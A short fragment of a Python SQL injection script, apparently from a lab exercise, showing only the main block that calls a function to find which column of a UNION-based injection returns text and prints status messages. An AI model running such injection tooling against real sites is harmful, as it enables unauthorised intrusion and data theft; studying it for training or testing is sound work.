...
if __name__ == '__main__':
    ...
    if num_col:
        ...
        print("[+] Foguring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print("[+] The column that contain text is" + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that contains text")
    else:
